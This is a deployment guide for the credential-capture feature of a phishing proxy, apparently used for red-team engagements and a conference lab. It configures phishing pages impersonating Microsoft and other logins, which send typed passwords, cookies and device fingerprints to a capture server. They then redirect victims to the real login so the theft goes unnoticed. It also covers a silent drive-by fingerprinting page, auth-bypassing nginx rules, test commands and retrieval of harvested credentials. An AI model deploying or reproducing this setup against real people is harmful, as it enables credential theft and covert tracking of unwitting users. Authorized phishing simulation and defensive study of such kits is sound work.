# External Credential Capture — Complete Setup Guide

This guide covers the complete setup and deployment of the `/api/capture/external` endpoint for capturing credentials from external tooling (Burp extensions, custom runners, phishing landers, etc.).

## Table of Contents

1. [Configuration](#configuration)
2. [File Locations](#file-locations)
3. [Lander Deployment](#lander-deployment)
4. [Testing](#testing)
5. [Log Formats](#log-formats)
6. [Viewing Captured Data](#viewing-captured-data)
7. [Troubleshooting](#troubleshooting)

---

## Configuration

### 1. Set the External Capture Token

The token is your API credential for the endpoint. Choose one of:

**Option A: Configuration Tab (Easiest)**
- Open: `https://<proxy-host>:8092/dashboard` → Settings → Configuration
- Find: `external_capture_token`
- Set: Any secure random string (e.g., `test_external_capture_token`)
- Save

**Option B: Environment Variable**
```bash
export EXTERNAL_CAPTURE_TOKEN="your-secure-token-here"
systemctl restart bitm-proxy
```

**Option C: Configuration File**
```bash
# Create the file
mkdir -p /data/config
echo "your-secure-token-here" > /data/config/external_capture_token.txt
chmod 600 /data/config/external_capture_token.txt

# Or add to config.json
echo '{"external_capture_token": "your-secure-token-here"}' > /data/config/config.json
```

**File Locations:**
- Config directory: `/data/config/`
- Config JSON: `/data/config/config.json`
- Token file: `/data/config/external_capture_token.txt`
- Environment: `/etc/systemd/system/bitm-proxy.service`

### 2. Configure IP Allowlist

Only IPs on this list can POST to the endpoint (127.0.0.1 is always allowed).

**Via Configuration Tab:**
- Settings → Configuration → `external_capture_allowed_ips`
- Examples:
  - `["127.0.0.1", "192.168.1.0/24"]` — local network
  - `["127.0.0.1", "0.0.0.0/0"]` — any IP (for cross-origin landers)

**Behind a reverse proxy (nginx, the DEF CON RTV Lab, etc.):** this check
uses the raw TCP peer address, **not** `X-Forwarded-For` — traffic
arriving via a reverse proxy shows up as the proxy's own address, not the
real client's, and gets rejected unless the proxy's address is on the
list. The DEF CON RTV Lab's `docker-compose.yml` works around this by
giving its compose network (`lab_net`) a fixed subnet and pre-seeding
`external_capture_allowed_ips` with it via a bind-mounted
`config/lab-config.json` (not `config/config.json` itself — that path is
`.gitignored`, reserved for real per-deployment secrets) — see
`docs/DEFCON-LAB-SETUP.md`. Same fix applies to any other nginx-fronted
deployment: allowlist the proxy container/host's actual address, not the
real visitor's.

### 3. Configure CORS (if hosting lander on separate domain)

If your lander is on `example.com` and you want it to POST to the proxy:

**Via Configuration Tab:**
- Settings → Configuration → `external_capture_cors_origins`
- Set: `["https://example.com"]` or `["*"]` for any origin

**Nginx Configuration** (if needed):
- File: `/etc/nginx/sites-available/example`
- Location block for `/api/capture/external` should have `auth_basic off;`
- See [Nginx Setup](#nginx-setup) below

---

## File Locations

### Key Directories

| Purpose | Path |
|---------|------|
| Configuration files | `/data/config/` |
| Stored credentials | `/data/credentials/` |
| Server logs | `/data/logs/captured.log` |
| Lander HTML | `/opt/bitm-proxy/pages/lander.html` |
| Nginx config | `/etc/nginx/sites-available/example` |
| Service config | `/etc/systemd/system/bitm-proxy.service` |

### Credential Storage

Each captured credential is stored as a JSON file:
```
/data/credentials/{site_id}__{user_id}.json
```

Example: `lander-demo__user1.json`

Contents:
```json
{
  "tokens": [],
  "cookies": [{"name": "session_id", "value": "abc123"}],
  "current_url": "https://example.com/lander.html",
  "captured_inputs": ["user1:testpass"],
  "external_capture_metadata": {
    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:152.0) Gecko/20100101 Firefox/152.0",
    "languages": ["en-US", "en"],
    "platform": "MacIntel",
    "vendor": "",
    "hw_concurrency": 18,
    "device_memory": null,
    "screen": {"w": 1728, "h": 1117, "aw": 1728, "ah": 1041, "color_depth": 30, "dpr": 2},
    "viewport": {"w": 1207, "h": 562},
    "timezone": "America/New_York",
    "referrer": "",
    "page_url": "https://example.com/lander.html",
    "fingerprint_id": "a1b2c3d4e5f6",
    "fingerprint_confidence": 0.99,
    "webgl": {"vendor": "Apple", "renderer": "Apple M1, or similar"}
  },
  "request_headers": {
    "user-agent": "Mozilla/5.0...",
    "accept-language": "en-US,en;q=0.9",
    "origin": "https://example.com",
    "referer": "https://example.com/lander.html"
  },
  "user_id": "user1",
  "site_id": "lander-demo",
  "capture_source": "external",
  "captured_at": 1782335087.6244009
}
```

---

## Lander Deployment

### What is a Lander?

A lander is an HTML form that captures credentials and POSTs them to `/api/capture/external`. It can be:
- Same-origin (hosted on the proxy itself)
- Cross-origin (hosted on a separate phishing domain)

### Setup Option 1: Local Lander (Same-Origin)

**File to edit:** `/opt/bitm-proxy/pages/lander.html`

**Key CONFIG block (lines 55-65):**
```javascript
const CONFIG = {
  site_id:      "lander-demo",           // ID prefix for stored credentials
  token:        "test_external_capture_token",  // Must match external_capture_token config
  endpoint:     "https://example.com/api/capture/external",  // Proxy endpoint
  next_url:     "https://myapps.microsoft.com/",  // Redirect after capture
};
```

**Update to match your setup:**
1. `site_id` — memorable name (e.g., "github", "office365", "aws")
2. `token` — must match the token you set in Configuration
3. `endpoint` — full HTTPS URL to your proxy's endpoint
4. `next_url` — real login URL to redirect to (makes flow look unbroken)

**Access the lander:**
```
https://<proxy-host>/lander.html
```

### Setup Option 2: Cross-Origin Lander (Separate Domain)

If hosting lander on `example.com` (or any other domain):

**Step 1: Nginx Configuration**

File: `/etc/nginx/sites-available/example`

Add this location block (should already exist, but verify):
```nginx
# External credential capture endpoint — auth-gated at the app level
location /api/capture/external {
    auth_basic off;  # Bypass nginx basic auth
    proxy_pass         http://127.0.0.1:8092/api/capture/external;
    proxy_http_version 1.1;
    proxy_set_header   Host              $host;
    proxy_set_header   X-Forwarded-For   $remote_addr;
    proxy_set_header   X-Forwarded-Proto $scheme;
}
```

Reload nginx:
```bash
nginx -t && systemctl reload nginx
```

**Step 2: Configure CORS on Proxy**

Settings → Configuration → `external_capture_cors_origins`
```json
["https://example.com"]
```

**Step 3: Update Lander Config**

`/opt/bitm-proxy/pages/lander.html` lines 55-65:
```javascript
const CONFIG = {
  site_id:      "lander-demo",
  token:        "test_external_capture_token",
  endpoint:     "https://example.com/api/capture/external",  // ← Your domain!
  next_url:     "https://myapps.microsoft.com/",
};
```

**Access the lander:**
```
https://example.com/lander.html
```

### Setup Option 3: Silent Fingerprinting (No Form)

For drive-by device profiling without user interaction, use `silent.html`:

**File:** `/opt/bitm-proxy/pages/silent.html`

**Key CONFIG block (lines 55-60):**
```javascript
const CONFIG = {
  site_id:       "silent-fp",                              // credential key prefix
  token:         "test_external_capture_token",            // must match proxy token
  endpoint:      "https://example.com/api/capture/external",  // capture endpoint
  redirect_url:  "https://www.microsoft.com/",             // where to redirect
};
```

**Features:**
- No visible form — user sees only "Loading..." text
- Automatically captures FingerprintJS, WebGL, screen, timezone, languages, UA
- Silently submits to `/api/capture/external` with `keepalive: true`
- Redirects to configured URL (appears as normal navigation)
- No password entry required

**Deployment:**
1. Update CONFIG block with your site_id, token, and endpoint
2. Copy to your web server or proxy's static directory
3. Link/iframe from phishing page or redirect flow
4. User never knows they were fingerprinted

**Access:**
```
https://example.com/silent.html
```

The captured data (fingerprint ID, confidence, screen, timezone) appears in the logs and Creds tab like any other external capture.

### Setup Option 4: DEF CON RTV Lab (Docker Compose)

The lab's `Dockerfile` bakes both pages into the image's `static/` at
build time (`COPY pages/silent.html pages/lander.html ./static/`) —
no manual copy-into-`static/` step needed, unlike Options 1-3 above.
Both are already pre-configured for same-origin deployment:

```javascript
// Both pages, already set this way in the repo:
token:    "lab-demo-capture-token",   // matches EXTERNAL_CAPTURE_TOKEN
          //   in docker-compose.yml — change both together
endpoint: "/api/capture/external",    // relative path, works through
          //   nginx regardless of domain
```

`nginx/rtvbitm` exposes friendly aliases that redirect to the real
filenames: `/silent` → `/silent.html`, `/lander` → `/lander.html`, both
proxied to `app:8091` (where `main.py`'s static catch-all serves them).
Linked from the landing page (`pages/lab-landing.html`) under
"Reconnaissance & capture demos", with an explicit on-page warning not to
enter real credentials on the lander page — it genuinely captures
whatever's typed and, per `next_url` matching the app's own
`default_login_url`, forwards the browser to the real Microsoft login
portal afterward so the flow looks unbroken, same as a real engagement.
See `docs/DEFCON-LAB-SETUP.md` for the full lab runbook.

---

## Testing

### Test 1: Direct API Request

```bash
# From the proxy host
curl -X POST http://localhost:8092/api/capture/external \
  -H "Authorization: Bearer test_external_capture_token" \
  -H "Content-Type: application/json" \
  -d '{
    "site_id": "lander-demo",
    "user": "user@example.com",
    "username": "user@example.com",
    "password": "testpass123",
    "source_url": "https://example.com/lander.html",
    "cookies": [{"name": "session_id", "value": "xyz123"}]
  }'
```

Expected response:
```json
{
  "status": "captured",
  "cred_key": "lander-demo__user_at_example_com",
  "tokens": 0,
  "cookies": 1
}
```

### Test 2: Via HTTPS (Cross-Origin)

```bash
# From any host
curl -X POST https://example.com/api/capture/external \
  -H "Authorization: Bearer test_external_capture_token" \
  -H "Content-Type: application/json" \
  -d '{"site_id": "lander-demo", "user": "test@example.com", ...}'
```

### Test 3: Browser Form Submission

1. Open: `https://example.com/lander.html`
2. Enter test username and password
3. Click Sign in
4. Browser should redirect to the configured `next_url`

---

## Log Formats

### Successful Capture

**Log format:**
```
[OK] site={site_id} user={user} tokens+={count} cookies+={count} from {ip} | ua={user-agent} | origin={origin} | fp_id={fingerprint_id} | fp_conf={confidence} | screen={w}x{h} | tz={timezone} | headers={header_count}
```

**Example:**
```
16:40:58 [INFO] [OK] site=lander-demo user=user1 tokens+=0 cookies+=1 from 127.0.0.1 | ua=Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:152.0) Geck | origin=https://example.com | fp_id=a1b2c3d4e5f6 | fp_conf=0.99 | screen=1728x1117 | tz=America/New_York | headers=20
```

**Fields:**
- `fp_id` — FingerprintJS visitor ID (first 16 chars). Shows "none" if fingerprinting not available
- `fp_conf` — FingerprintJS confidence score (0.0 to 1.0)
- `screen` — Screen resolution in WxH format
- `tz` — Timezone from Intl.DateTimeFormat
- `ua` — User-Agent (truncated to 60 chars)
- `origin` — HTTP Origin header
- `headers` — Total HTTP request headers captured

**View logs:**
```bash
# Real-time
tail -f /data/logs/captured.log | grep "OK"

# Filter by status
grep "\[OK\]" /data/logs/captured.log

# Parse JSON
tail -100 /data/logs/captured.log | python3 -c "
import sys, json
for line in sys.stdin:
    entry = json.loads(line.strip().split('\t', 1)[1] if '\t' in line else line)
    if 'OK' in entry.get('message', ''):
        print(f\"{entry['time']} {entry['message']}\")
"
```

### Failed Capture

**IP Blocked:**
```
[REJECTED] IP_BLOCKED — ip=192.168.1.50
```

**Token Invalid:**
```
[REJECTED] TOKEN_INVALID — ip=199.168.198.186
```

### Capture Events

Each successful capture also logs a capture event:
```
Capture event: site=lander-demo tokens=0 cookies=1 at 2026-06-24 16:40:58
```

---

## Viewing Captured Data

### Dashboard

**Access:** `https://<proxy-host>/dashboard`

**Path:**
1. Click **Creds** tab at top
2. Find the site card (e.g., `lander-demo__user1`)
   - Card header shows summary: "N headers, N cookies, N tokens, N inputs, fingerprint" (fingerprint indicator appears when metadata is captured)
3. Click the card to expand
4. View expandable sections:
   - **Request Headers** — all HTTP headers sent with the capture
   - **Tokens** — captured bearer/access tokens
   - **Cookies** — all captured cookies
   - **localStorage** — stored browser data
   - **sessionStorage** — session data
   - **Inputs** — captured username:password pairs
   - **Fingerprint & Metadata** — device profile including:
     - FingerprintJS visitor ID and confidence score
     - Screen resolution, DPR, color depth
     - Timezone, languages, platform
     - Hardware concurrency, WebGL renderer/vendor
     - User-Agent, viewport, referrer, page URL
     - Sec-CH-UA client hints (if available)

### Direct File Inspection

```bash
# List all captures
ls -lah /data/credentials/

# View specific capture
cat /data/credentials/lander-demo__user1.json | python3 -m json.tool

# Extract just username:password
cat /data/credentials/lander-demo__user1.json | python3 -c "
import sys, json
data = json.load(sys.stdin)
print('User:', data.get('user_id'))
print('Inputs:', data.get('captured_inputs'))
print('Cookies:', len(data.get('cookies', [])))
"
```

---

## Troubleshooting

### 401 Unauthorized Error

**Symptom:** Browser gets 401 when submitting lander form

**Causes & Fixes:**

1. **Wrong token in lander**
   - Check: `lander.html` line 57 `token: "..."`
   - Should match: Configuration → `external_capture_token`
   - Fix: Update the token in lander.html

2. **IP not in allowlist**
   - Check: Configuration → `external_capture_allowed_ips`
   - Fix: Add your IP or `0.0.0.0/0` to allow all

3. **Nginx basic auth blocking**
   - Check: `/etc/nginx/sites-available/example`
   - Look for: `location /api/capture/external { auth_basic off; ... }`
   - Fix: Add the location block if missing, reload nginx

4. **CORS preflight blocked**
   - Check DevTools Network tab — look for OPTIONS request
   - Check: Configuration → `external_capture_cors_origins`
   - Fix: Add your lander's origin (e.g., `https://example.com`)

### Dashboard Shows No Data

**Symptom:** Creds tab is empty or credentials don't appear

**Causes & Fixes:**

1. **WebSocket not connected**
   - Check: Browser DevTools Network tab → look for `ws://` or `wss://` connections
   - Fix: Refresh the dashboard page (Ctrl+R or Cmd+R)

2. **Credentials stored but not displayed**
   - Verify: `/data/credentials/` has files
   - Check: `ls -la /data/credentials/ | grep lander`
   - Verify files were recently modified: `ls -lah /data/credentials/ | sort -k 6,7 | tail -5`
   - If files exist: Dashboard may need refresh or WebSocket reconnect

3. **Fingerprint section not expanding**
   - If "fingerprint" appears in card header but section doesn't show:
   - Try: Hard refresh (Ctrl+Shift+R or Cmd+Shift+R)
   - Verify: Credential file has `external_capture_metadata` field
   - Check: `cat /data/credentials/{site_id}__{user}.json | python3 -m json.tool | grep -A 20 external_capture_metadata`

### No Logs Appearing

**Symptom:** Form submission succeeds (200 OK) but no logs in dashboard

**Causes & Fixes:**

1. **Check if data was actually saved**
   ```bash
   ls -lah /data/credentials/ | sort -k 6,7 | tail -5
   ```

2. **Verify endpoint is being called**
   ```bash
   tail -20 /data/logs/captured.log | grep "OK\|REJECTED"
   ```

3. **Check configuration**
   ```bash
   curl -s http://localhost:8092/api/config | python3 -c "
   import sys, json
   cfg = json.load(sys.stdin)
   print('Token:', repr(cfg.get('external_capture_token', '')))
   print('IPs:', cfg.get('external_capture_allowed_ips', []))
   "
   ```

### Form Submission Doesn't Redirect

**Symptom:** Form hangs after clicking Sign In

**Check:**
1. DevTools Console for JavaScript errors
2. Network tab to see if POST completes
3. Lander config `next_url` is valid HTTPS URL

**Fix:**
```javascript
// In lander.html, ensure next_url is set
next_url: "https://myapps.microsoft.com/",  // Not empty!
```

---

## Advanced Usage

### Custom Metadata Capture

Lander can capture any custom data in `captured_inputs` object:

```javascript
// In lander.html, modify the body before POST
body.captured_inputs = {
  "fingerprint": await fingerprint(),
  "custom_field": "custom_value",
  "device_type": "mobile",
  // ... any other data
};
```

This data is stored in the credential record as `external_capture_metadata`.

### Multiple Landers

You can have multiple landers for different sites:

1. Copy `/opt/bitm-proxy/pages/lander.html` → `lander-github.html`, `lander-aws.html`
2. Update each with different `site_id` and styling
3. Access each at `https://<host>/lander-github.html`, etc.

### Token Rotation

After each engagement, rotate the token:

1. Settings → Configuration → `external_capture_token`
2. Generate new random string
3. Save
4. Old landers will return 401

---

## Security Notes

⚠️ **The bearer token is visible in page source** — use a single-purpose token and rotate after each engagement.

⚠️ **CORS origin allowlist is required** for cross-origin landers — don't use `*` in production without understanding the implications.

⚠️ **IP allowlist + bearer token** are the only auth controls — treat the token like a password.

⚠️ **Credentials are encrypted at rest** if `CREDENTIAL_PASSPHRASE` is set, but all fields are still visible in the unencrypted JSON while running.

---

## See Also

- `SESSIONS.md` — Detailed field reference for external capture payload
- `ARCHITECTURE.md` — System design and data flow
- `backend/routes/capture.py` — Endpoint implementation
- `backend/debug_server.py` — Dashboard rendering
